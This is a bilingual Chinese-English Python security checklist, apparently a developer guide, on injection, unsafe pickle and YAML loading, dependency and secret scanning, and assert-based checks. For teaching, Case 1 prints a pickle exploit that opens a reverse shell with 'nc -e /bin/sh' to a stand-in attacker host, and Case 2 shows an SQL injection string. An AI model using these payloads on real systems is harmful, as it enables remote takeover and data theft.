# Python 安全性檢核清單 / Python Security Checklist

這不是一份讓你通過合規審計的死板文件，這是一份為了保護你的 Production 環境不被輕易攻破的實戰指南。Python 的靈活性（Flexibility）是其最大優勢，同時也是安全上的最大隱憂。

## Mental model｜心智模型

在 Python 開發中，建立安全意識的核心心智模型可以歸納為以下三點：

1.  **動態執行的雙面刃 (The Double-Edged Sword of Dynamic Execution)**
    Python 允許在執行期動態載入模組、序列化物件甚至執行字串代碼（`eval`, `exec`）。**永遠假設任何來自外部的輸入（Input）都試圖利用這些動態特性來執行惡意代碼**。不要相信 User Input，也不要相信資料庫裡的舊資料。

2.  **依賴鏈即攻擊面 (Dependency Chain as Attack Surface)**
    Python 生態系高度依賴 PyPI。你的專案可能只寫了 500 行程式碼，但 `pip install` 下來卻引入了 50,000 行第三方代碼。**供應鏈安全（Supply Chain Security）與你自己的程式碼品質同等重要**。

3.  **顯式優於隱式 (Explicit is better than Implicit)**
    這條 Python 之禪同樣適用於安全。不要依賴框架的「自動防護」而不去驗證。例如：不要假設 ORM 會自動處理所有 Injection，也不要假設 Web Framework 的預設設定就是安全的。

---

## Patterns & best practices｜常見模式與最佳實務

### 1. 防範注入攻擊 (Injection Prevention)
*   **SQL Injection**: 絕對禁止使用 f-string 或字串串接來組裝 SQL。
    *   **Do**: 使用 ORM (SQLAlchemy, Django ORM) 或 DB-API 的參數化查詢 (Parameterized Queries)。
    *   **Why**: 參數化查詢會將數據與指令分開處理，資料庫驅動會自動轉義特殊字符。
*   **Command Injection**: 避免使用 `os.system`。
    *   **Do**: 使用 `subprocess.run` 並設定 `shell=False`（預設值），將參數作為 list 傳遞。
    *   **Example**: `subprocess.run(["ls", "-l", filename])` 而非 `subprocess.run(f"ls -l {filename}", shell=True)`。

### 2. 安全的反序列化 (Secure Deserialization)
*   **Pickle is Dangerous**: `pickle` 模組設計之初就不是為了安全性。它可以執行任意代碼。
    *   **Do**: 對於不可信來源的資料，使用 `json`。如果必須處理複雜物件，使用 `Pydantic` 進行 schema validation 後再轉換。
    *   **YAML**: PyYAML 的 `yaml.load` 預設是不安全的。
    *   **Do**: 務必使用 `yaml.safe_load()`。

### 3. 依賴管理與掃描 (Dependency Management)
*   **Pin Versions**: 在 `requirements.txt` 或 `pyproject.toml` 中鎖定版本（包含 hash）。
*   **Automated Scanning**: 在 CI/CD 流程中加入漏洞掃描工具。
    *   **Tools**: `pip-audit`, `safety`, 或 GitHub Dependabot。

### 4. 敏感資料處理 (Secrets Management)
*   **Environment Variables**: 絕不將 API Key、Password 硬編碼（Hardcode）在 `.py` 檔案中。
*   **Do**: 使用 `python-dotenv` 或 `pydantic-settings` 從環境變數讀取。
*   **Git Hooks**: 使用 `pre-commit` 搭配 `detect-secrets` 或 `gitleaks` 防止意外 commit 密鑰。

---

## Anti-patterns & pitfalls｜反模式與踩雷點

### 1. The `assert` Statement Trap
*   **Anti-pattern**: 使用 `assert` 來做權限檢查或數據驗證。
    ```python
    def delete_user(user):
        assert user.is_admin, "User must be admin"  # DANGEROUS!
        ...
    ```
*   **Pitfall**: Python 在優化模式下執行（`python -O`）時，所有的 `assert` 語句都會被**直接移除**。這意味著你的安全檢查在 Production 環境可能根本不存在。
*   **Fix**: 使用 `if not user.is_admin: raise PermissionError(...)`。

### 2. The Mutable Default Argument (Security Context)
*   **Anti-pattern**: 雖然這是常見 bug，但在安全情境下，它可能導致不同使用者的 session 數據洩漏或污染。
    ```python
    def add_audit_log(entry, log=[]): # Don't do this
        log.append(entry)
        return log
    ```

### 3. Blindly Trusting `tarfile` / `zipfile`
*   **Pitfall (Zip Slip)**: 解壓縮上傳的檔案時，如果檔案名稱包含 `../../`，可能會覆蓋系統關鍵檔案。
*   **Fix**: 在 Python 3.11+ 使用 `tarfile.extractall(..., filter='data')`，或在舊版本手動檢查路徑是否跳出目標目錄。

### 4. Logging Sensitive Data
*   **Anti-pattern**: 在 Exception handling 中直接 log 整個 `request` 物件或 `payload`。
*   **Pitfall**: 使用者的密碼、Token 可能因此被寫入日誌系統（Splunk, ELK），造成二次洩漏。

---

## Checklists & workflows｜檢查清單與流程

### Day-to-Day Development Checklist
- [ ] **Input Validation**: 所有外部輸入是否都經過 Schema 驗證（如 Pydantic）？
- [ ] **No Secrets in Code**: 檢查是否有硬編碼的密碼或 Token？
- [ ] **No `shell=True`**: 檢查所有 `subprocess` 調用，確認參數是否為 List 形式。
- [ ] **No `eval()` / `exec()`**: 除非絕對必要且經過嚴格審計，否則移除這些調用。
- [ ] **Logic Checks**: 權限邏輯是否使用了 `if` 而非 `assert`？

### CI/CD Security Pipeline
1.  **Static Application Security Testing (SAST)**:
    *   執行 `bandit -r .`：掃描常見 Python 安全漏洞（如硬編碼密碼、弱加密算法）。
2.  **Dependency Audit**:
    *   執行 `pip-audit` 或 `safety check`：比對依賴套件是否存在已知 CVE。
3.  **Secret Scanning**:
    *   執行 `gitleaks` 或類似工具，確保沒有密鑰進入版控。

### Production Readiness
- [ ] **Debug Mode**: 確認 Web Framework (Django/Flask) 的 `DEBUG = False`。
- [ ] **Error Handling**: 確認錯誤訊息不會洩漏 Stack Trace 給終端使用者。
- [ ] **HTTPS**: 確保所有 Cookie 設有 `Secure` 與 `HttpOnly` 屬性。

---

## Real-world examples｜實戰案例

### Case 1: The "Pickle" RCE (Remote Code Execution)

這是一個經典的漏洞，常見於開發者為了方便，直接將 User 上傳的 Session 或設定檔用 Pickle 存取。

**Vulnerable Code (Do NOT use):**

```python
import pickle
import base64
from flask import request

@app.route('/load_profile', methods=['POST'])
def load_profile():
    # 攻擊者可以構造惡意 payload
    data = base64.b64decode(request.form['profile_data'])
    # 這裡會直接執行 payload 中的代碼
    user_profile = pickle.loads(data)
    return f"Welcome back, {user_profile['username']}"
```

**Exploit (How an attacker thinks):**

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        # 當 pickle.loads 被呼叫時，這行指令會被執行
        return (os.system, ('nc -e /bin/sh attacker.com 4444',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
# 攻擊者發送這個 payload，伺服器就會反彈 shell
```

**Fix:** 改用 `json.loads()`，它只處理數據，不執行代碼。

### Case 2: SQL Injection via f-string

即使是資深工程師，有時為了「方便」也會寫出這種代碼。

**Vulnerable Code:**

```python
# 假設 user_input = "' OR '1'='1"
query = f"SELECT * FROM users WHERE username = '{user_input}'"
cursor.execute(query)
# 實際執行: SELECT * FROM users WHERE username = '' OR '1'='1'
# 結果: 撈出所有使用者資料
```

**Secure Pattern (DB-API):**

```python
# 讓資料庫驅動處理轉義
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (user_input,))
```

### Case 3: The `assert` optimization disaster

某金融系統的轉帳檢查：

```python
def transfer(user, amount):
    # 如果運維人員為了效能開啟了 python -O (Optimize)
    # 這行檢查會被完全跳過！
    assert user.balance >= amount, "Insufficient funds"
    
    user.balance -= amount
    recipient.balance += amount
    save()
```

**Consequence**: 使用者可以轉出超過餘額的錢。務必使用 `if ... raise ...`。